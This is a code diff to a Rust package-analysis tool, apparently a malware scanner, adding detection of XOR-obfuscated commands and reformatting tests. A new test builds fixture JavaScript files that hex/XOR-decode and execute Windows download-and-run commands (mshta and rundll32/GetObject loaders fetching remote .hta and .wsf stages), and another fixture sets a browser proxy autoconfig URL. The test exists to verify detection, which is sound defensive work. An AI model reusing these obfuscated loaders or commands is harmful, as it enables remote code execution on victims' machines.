@@ -2382,7 +2382,11 @@ fn unresolved_downloader_records(
         let Some(view) = &file.filefacts else {
             continue;
         };
-        for call in find::discover_fetch_calls(&file.file_type, &view.symbols).unresolved {
+        for call in find::discover_fetch_calls(&file.file_type, &view.symbols)
+            .unresolved
+            .into_iter()
+            .chain(find::discover_batch_programs(&file.file_type, &view.values).unresolved)
+        {
             let location = call
                 .offset
                 .map_or_else(String::new, |offset| format!(" at byte {offset}"));
@@ -5910,6 +5914,7 @@ fn collect_references_from_input(
                 }),
         );
         refs.extend(find::fetch_calls(&file.file_type, &view.symbols));
+        refs.extend(find::discover_batch_programs(&file.file_type, &view.values).references);
         if refs.is_empty() {
             continue;
         }
@@ -7167,6 +7172,7 @@ fn merge_payload(
         if let Some(view) = &file.filefacts {
             let mut refs = find::references_from_facts(&view.values, &view.references);
             refs.extend(find::fetch_calls(&file.file_type, &view.symbols));
+            refs.extend(find::discover_batch_programs(&file.file_type, &view.values).references);
             mark_published_npm_development_refs(&rec.locator, &file.path, &mut refs);
             if is_ci_context(file) {
                 for reference in &mut refs {
@@ -9394,7 +9400,11 @@ mod tests {
         let shadowed = b"function f(browser){browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:'https://shadow.test/decoy.pac'}});}";
         let root = write_tar_zst(
             tmp.path(),
-            &[("background.js", javascript), ("shadowed.js", shadowed), ("README.md", README)],
+            &[
+                ("background.js", javascript),
+                ("shadowed.js", shadowed),
+                ("README.md", README),
+            ],
         );
         let path = root.to_string_lossy().into_owned();
         let owner = "bb".repeat(32);
@@ -9415,15 +9425,29 @@ mod tests {
                   "size": shadowed.len() as u64,
                   "findings": [{ "id": TRAIT_BROWSER_PAC_URL }] }
             ]
-        })).expect("report deserializes");
+        }))
+        .expect("report deserializes");
         let groups = collect_references(&report, &root, CiRefs::Skip);
-        let matches: Vec<_> = groups.iter().flat_map(|(sha, refs)| refs.iter().map(move |r| (sha, r)))
-            .filter(|(_, reference)| reference.source == "ast-browser-pac-url").collect();
+        let matches: Vec<_> = groups
+            .iter()
+            .flat_map(|(sha, refs)| refs.iter().map(move |r| (sha, r)))
+            .filter(|(_, reference)| reference.source == "ast-browser-pac-url")
+            .collect();
         assert_eq!(matches.len(), 1, "{groups:?}");
         assert_eq!(matches[0].0, &owner);
         assert_eq!(locator(matches[0].1), "https://proxy.test/config.pac");
-        assert!(!groups.iter().flat_map(|(_, refs)| refs).any(|r| locator(r).contains("docs.test")));
-        assert!(!groups.iter().flat_map(|(_, refs)| refs).any(|r| locator(r).contains("shadow.test")));
+        assert!(
+            !groups
+                .iter()
+                .flat_map(|(_, refs)| refs)
+                .any(|r| locator(r).contains("docs.test"))
+        );
+        assert!(
+            !groups
+                .iter()
+                .flat_map(|(_, refs)| refs)
+                .any(|r| locator(r).contains("shadow.test"))
+        );
     }
 
     #[test]
@@ -10491,6 +10515,76 @@ mod tests {
 mod dependency_gap_tests {
     use super::*;
     #[test]
+    fn compact_archive_keeps_xor_decoded_program_targets_after_serialization() {
+        use sha2::Digest;
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("commands.tar");
+        let cases = [
+            (
+                "mshta https://program.fixturetests.net/stage.hta",
+                "https://program.fixturetests.net/stage.hta",
+                false,
+            ),
+            (
+                r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:https://program.fixturetests.net/stage.wsf")"#,
+                "https://program.fixturetests.net/stage.wsf",
+                true,
+            ),
+        ];
+        let mut archive = tar::Builder::new(std::fs::File::create(&path).unwrap());
+        for (i, (command, _, loop_)) in cases.iter().enumerate() {
+            let encoded: String = command.bytes().map(|b| format!("{:02x}", b ^ 81)).collect();
+            let operation = if *loop_ {
+                "const raw=Buffer.from(DATA,'hex');const plain=Buffer.alloc(raw.length);for(let i=0;i<raw.length;i++){plain[i]=raw[i]^KEY;}cp.exec(plain.toString('utf8'));"
+            } else {
+                "const line=Buffer.from(DATA,'hex').map(b=>b^KEY).toString('utf8');cp.exec(line);"
+            };
+            let source = format!(
+                "const cp=require('child_process');const DATA='{encoded}';const KEY=81;function f(){{{operation}}}"
+            );
+            let mut header = tar::Header::new_ustar();
+            header.set_size(source.len() as u64);
+            header.set_mode(0o644);
+            header.set_cksum();
+            archive
+                .append_data(
+                    &mut header,
+                    format!("package/command-{i}.js"),
+                    source.as_bytes(),
+                )
+                .unwrap();
+        }
+        archive.finish().unwrap();
+        let mut report = cleave::Engine::empty()
+            .with_compact_members(true)
+            .analyze_file(&path, &AnalysisOptions::default())
+            .unwrap();
+        report.finalize();
+        let report: AnalysisReport =
+            serde_json::from_slice(&serde_json::to_vec(&report).unwrap()).unwrap();
+        let groups = collect_references(&report, Path::new("not-on-disk"), CiRefs::Skip);
+        let refs: Vec<_> = groups
+            .iter()
+            .flat_map(|(sha, refs)| {
+                refs.iter()
+                    .filter(|r| r.source == "ast-batch-program")
+                    .map(move |r| (sha, r))
+            })
+            .collect();
+        assert_eq!(refs.len(), 2);
+        for (command, url, _) in cases {
+            let sha = format!("{:x}", sha2::Sha256::digest(command.as_bytes()));
+            let (owner, reference) = refs.iter().find(|(_, r)| locator(r) == url).unwrap();
+            assert_eq!(owner.as_str(), sha);
+            assert_eq!(reference.kind, RefKind::Dependency);
+            assert_eq!(reference.offset, Some(command.find(url).unwrap() as u64));
+            assert!(report.files.iter().any(|f| f.sha256 == sha
+                && f.file_type == "batch"
+                && f.path.contains("##hex+xor@")));
+        }
+    }
+
+    #[test]
     fn real_compact_archive_keeps_glib_stylesheet_import_dependencies() {
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("theme.tar");
@@ -10504,7 +10598,9 @@ GLib.file_set_contents(path, "status", "@import 'https://theme.fixturetests.net/
         header.set_size(source.len() as u64);
         header.set_mode(0o644);
         header.set_cksum();
-        archive.append_data(&mut header, "extension.js", &source[..]).unwrap();
+        archive
+            .append_data(&mut header, "extension.js", &source[..])
+            .unwrap();
         archive.finish().unwrap();
         let mut report = cleave::Engine::empty()
             .with_compact_members(true)
@@ -10513,16 +10609,30 @@ GLib.file_set_contents(path, "status", "@import 'https://theme.fixturetests.net/
         report.finalize();
         // Exercise the retained, serialized archive view, not a separately
         // reparsed source file that would hide compaction regressions.
-        let report: AnalysisReport = serde_json::from_slice(&serde_json::to_vec(&report).unwrap()).unwrap();
+        let report: AnalysisReport =
+            serde_json::from_slice(&serde_json::to_vec(&report).unwrap()).unwrap();
         let groups = collect_references(&report, Path::new("not-on-disk"), CiRefs::Skip);
-        let imports: Vec<_> = groups.iter().flat_map(|(sha, refs)| {
-            refs.iter().filter(|r| r.source == "ast-glib-stylesheet-import").map(move |r| (sha, r))
-        }).collect();
+        let imports: Vec<_> = groups
+            .iter()
+            .flat_map(|(sha, refs)| {
+                refs.iter()
+                    .filter(|r| r.source == "ast-glib-stylesheet-import")
+                    .map(move |r| (sha, r))
+            })
+            .collect();
         assert_eq!(imports.len(), 1);
-        assert_eq!(locator(imports[0].1), "https://theme.fixturetests.net/style.css");
+        assert_eq!(
+            locator(imports[0].1),
+            "https://theme.fixturetests.net/style.css"
+        );
         assert_eq!(imports[0].1.kind, RefKind::Dependency);
         assert_eq!(imports[0].1.offset, Some(0));
-        assert!(report.files.iter().any(|f| f.path.ends_with("!!extension.js") && &f.sha256 == imports[0].0));
+        assert!(
+            report
+                .files
+                .iter()
+                .any(|f| f.path.ends_with("!!extension.js") && &f.sha256 == imports[0].0)
+        );
     }
 
     #[test]
